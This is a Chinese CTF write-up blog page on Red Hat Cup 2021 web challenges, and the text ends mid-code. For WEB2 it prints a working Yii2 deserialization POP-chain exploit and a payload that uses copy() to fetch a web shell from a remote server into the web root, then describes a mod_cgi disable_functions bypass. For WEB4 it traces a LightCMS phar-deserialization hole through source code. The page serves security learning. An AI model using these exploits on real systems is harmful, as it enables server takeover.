@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。 这次还是只解出来一题WEB2，，老废物了。。。。 最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。&#x3D; &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF玩耍系列[3] - [红帽杯2021] WEB2 &amp;&amp; WEB4">
+<meta property="og:url" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/index.html">
+<meta property="og:site_name" content="Xiaopan233 Blog">
+<meta property="og:description" content="昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。 这次还是只解出来一题WEB2，，老废物了。。。。 最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。&#x3D; &#x3D;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/2.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-1.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-4.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-3.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-2.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-5.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-6.png">
+<meta property="og:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1-7.png">
+<meta property="article:published_time" content="2021-05-10T14:49:01.000Z">
+<meta property="article:modified_time" content="2021-05-10T15:47:31.457Z">
+<meta property="article:author" content="Xiaopan233">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="LightCMS">
+<meta property="article:tag" content="Yii2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/"/>
+
+
+
+
+
+  <title>CTF玩耍系列[3] - [红帽杯2021] WEB2 && WEB4 | Xiaopan233 Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xiaopan233 Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/atom.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/2020/01/01/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+<script>
+  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
+</script>
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiaopan233 Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF玩耍系列[3] - [红帽杯2021] WEB2 && WEB4</h1>
+        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-05-10T22:49:01+08:00">
+                2021-05-10
+              </time>
+            
+
+            
+
+            
+          </span>
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/WEB/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。</p>
+<p>这次还是只解出来一题WEB2，，老废物了。。。。</p>
+<p>最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。= =</p>
+<span id="more"></span>
+
+<br>
+
+<h1 id="WEB2-Yii2反序列化"><a href="#WEB2-Yii2反序列化" class="headerlink" title="WEB2 - Yii2反序列化"></a>WEB2 - Yii2反序列化</h1><p>这道题主要考察两个东西吧：Yii2反序列的链子 及 Apache mod_cgi bypass disable_functions</p>
+<br>
+
+<p>首先找入口点，比赛平台给的控制器为  <code>/controllers/SiteController.php</code> 。</p>
+<p>找到反序列化的入口点 <code>actionAbout()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;Hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = base64_decode(<span class="variable">$message</span>);</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不清楚路由的，看到页面上的 <strong>“About” 按钮</strong>，点过去就是了。</p>
+<br>
+
+<p>反序列化POC，这里就不细细分析了，详情可以看看下面这些文章：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg">https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//执行的函数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="comment">//函数参数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;999&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过该POC，得到 disable_functions ，这里注意下，由于有 disable_functions。所以在 poc上无脑冲命令执行的将会得到报错回显。。。这可不是反序列化链子错了。。而是函数被禁用了。。</p>
+<br>
+
+<p><strong>disable_functions内容：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,<span class="keyword">unset</span>,unlink,<span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<p>经过了多次测试后，得到这玩意有两个坑：</p>
+<ol>
+<li>使用 <code>assert(eval())</code> 形式执行命令时，注意 eval 里的语句最后要手动加个 <code>die()</code>，不然会使得程序继续执行而报错</li>
+<li>直接写shell，该程序会自动将文件内 $ 后面的字符全部删去，导致无法直接写shell，但可以通过 php 的 copy 函数从 vps 上把shell扒拉下来</li>
+</ol>
+<br>
+
+<p><strong>修改POC：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//这里的Web目录可以根据前面的 phpinfo 得知</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;eval(\&#x27;var_dump(copy(&quot;https://xxx.com/11.txt&quot;,&quot;/var/www/html/web/122.php&quot;));die();\&#x27;);&#x27;</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>上shell后，在 / 目录下发现 readflag 文件。查看权限发现是 003 是 wx 权限，没r权限。说明我们需要执行这个文件才能获取 flag。  </p>
+<br>
+
+<p>由于 putenv 被禁用了我们不可能使用 LD_PRELOAD 来 Bypass disable_function 。通过查看 apache配置文件可知，.htaccess 开着，并且mod_cgi 也开着。想到也许能通过 .htaccess来指定加载另外一个 php.ini。本以为是史无前例的发现，百度了才发现原来是人尽皆知的东西。。。。==</p>
+<br>
+
+<p><strong>httpd.conf</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">Directory</span> <span class="string">&quot;/var/www/html/web/&quot;</span>&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    <span class="comment"># Allow open access:</span></span><br><span class="line">    <span class="keyword">Require</span> all granted</span><br><span class="line">&lt;/<span class="built_in">Directory</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>我们可以使用  Apache Mod CGI 来 bypass，图省事直接用蚁剑插件。。这里挖个坑，过段时间没事干了去研究下 bypass disable_functions 的原理。。翻找文章的时候发现了 <a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109078117">一篇文</a> 感觉写的还可以。</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1.png" width="600px">
+
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/2.png" width="600px">
+
+
+
+<br>
+
+<h1 id="WEB4-LightCMS-0day"><a href="#WEB4-LightCMS-0day" class="headerlink" title="WEB4 - LightCMS 0day"></a>WEB4 - LightCMS 0day</h1><p><a target="_blank" rel="noopener" href="https://igml.top/2021/05/10/lightcms-RCE/#more">参考原文</a></p>
+<p>LightCMS 是基于 Laravel 框架的一个CMS。目前的最新版 v1.3.7 基于 Laravel 6.x 开发，PHP&gt;=7.2。</p>
+<p><strong>挖掘思路：</strong></p>
+<ol>
+<li>搜索得到 LightCMS 的历史漏洞 <a target="_blank" rel="noopener" href="https://github.com/eddy8/LightCMS/issues/19">RCE in “catchImage”</a>‘  (CVE-2021-27112)</li>
+<li>得知LightCMS可以上传远程文件</li>
+<li><strong>若</strong> 解析远程文件时存在文件函数，PHP&lt;8 可触发 phar 反序列化</li>
+<li>在 phpggc 中有 Laravel 6.x 的链子</li>
+</ol>
+<p>按着这个思路，我们重点调试上传远程文件时的代码即可。（这些都是后面看了wp才得出的结论==，当时根本没有想到 Phar反序列化和 文件上传结合起来。。。果然还是太菜了）</p>
+<h2 id="补充点-Laravel-的知识"><a href="#补充点-Laravel-的知识" class="headerlink" title="补充点 Laravel 的知识"></a>补充点 Laravel 的知识</h2><p>由于之前没怎么摸过 Laravel，这里提一点 Laravel的基本知识，有助于理解这个漏洞</p>
+<h3 id="路由、控制器"><a href="#路由、控制器" class="headerlink" title="路由、控制器"></a>路由、控制器</h3><p>路由文件位置： <strong>/routes</strong></p>
+<p>控制器文件位置：**/app/Http/Controllers**</p>
+<p>/app/Http 目录结构：</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-1.png" width="300px">
+
+
+
+<p><strong>路由</strong></p>
+<p>路由文件会被 <code>App\Providers\RouteServiceProvider</code> 自动加载。可以在该文件中添加路由文件。格式如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//api 和 web 是默认就有的</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapApiRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapWebRoutes();</span><br><span class="line">    <span class="comment">//admin 和 member 是 LightCMS 自己加的</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapMemberRoutes();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要写对应路由文件的路由</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mapAdminRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Route::prefix(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        -&gt;middleware(<span class="string">&#x27;web&#x27;</span>)</span><br><span class="line">        <span class="comment">//路由文件对应的模块位置</span></span><br><span class="line">        -&gt;namespace(<span class="keyword">$this</span>-&gt;namespace . <span class="string">&#x27;\Admin&#x27;</span>)</span><br><span class="line">        <span class="comment">//路由文件位置</span></span><br><span class="line">        -&gt;group(base_path(<span class="string">&#x27;routes/admin.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>知道了有哪些路由文件被加载后，我们直接看对应的路由文件 (<code>routes/admin.php</code>)，格式如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Route::group(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;admin::&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        .....   </span><br><span class="line">        Route::middleware(<span class="string">&#x27;log:admin&#x27;</span>, <span class="string">&#x27;auth:admin&#x27;</span>, <span class="string">&#x27;authorization:admin&#x27;</span>)-&gt;group(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//1. POST请求才会执行该路由</span></span><br><span class="line">            <span class="comment">//2. 路由 url 格式为 /neditor/serve/。&#123;type&#125; 表示参数</span></span><br><span class="line">            <span class="comment">//3. NEditorController@serve 对应 /app/Http/Controllers/Admin/NEditorController.php 的  serve() 方法</span></span><br><span class="line">            Route::post(<span class="string">&#x27;/neditor/serve/&#123;type&#125;&#x27;</span>, <span class="string">&#x27;NEditorController@serve&#x27;</span>)-&gt;name(<span class="string">&#x27;neditor.serve&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>综上可知发送 POST格式的 <code>admin/neditor/serve/xxx</code> 会被路由到 <code>/app/Http/Controllers/Admin/NEditorController.php</code> 的<code>serve()</code>方法。这个php文件就是开发者自己写的处理业务逻辑的文件了</p>
+<p>查看 <code>serve()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的 $type 对应路由中定义的参数 &#123;type&#125;</span></span><br><span class="line"><span class="comment">//即发送请求 admin/neditor/serve/xxx 时，$type值为 xxx</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serve</span>(<span class="params">Request <span class="variable">$request</span>, <span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!method_exists(<span class="built_in">self</span>::class, <span class="variable">$type</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;未知操作&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//根据传入$type调用本类同名方法</span></span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="built_in">self</span>::class . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$type</span>, <span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞逻辑"><a href="#漏洞逻辑" class="headerlink" title="漏洞逻辑"></a>漏洞逻辑</h2><p>根据 CVE-2021-27112 的漏洞点，定位到 <code>NEditorController.php</code> 的 <code>catchImage()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">catchImage</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = array_unique((<span class="keyword">array</span>) <span class="variable">$request</span>-&gt;post(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">    <span class="variable">$urls</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//解析$_POST[&#x27;file&#x27;]，进行远程文件拉取</span></span><br><span class="line">        <span class="comment">//!! 重点跟进该方法 !!</span></span><br><span class="line">        <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;fetchImageFile(<span class="variable">$v</span>);</span><br><span class="line">        <span class="comment">//!! 重点跟进该方法 !!</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//CVE-2021-27112补丁，校验远程文件合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$image</span> || !<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>] || !<span class="keyword">$this</span>-&gt;isAllowedImageType(<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$path</span> = date(<span class="string">&#x27;Ym&#x27;</span>) . <span class="string">&#x27;/&#x27;</span> . md5(<span class="variable">$v</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">        <span class="comment">//保存文件</span></span><br><span class="line">        Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))</span><br><span class="line">            -&gt;put(<span class="variable">$path</span>, <span class="variable">$image</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//返回保存文件路径</span></span><br><span class="line">        <span class="variable">$urls</span>[] = [</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span> =&gt; Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))-&gt;url(<span class="variable">$path</span>),</span><br><span class="line">            <span class="string">&#x27;source&#x27;</span> =&gt; <span 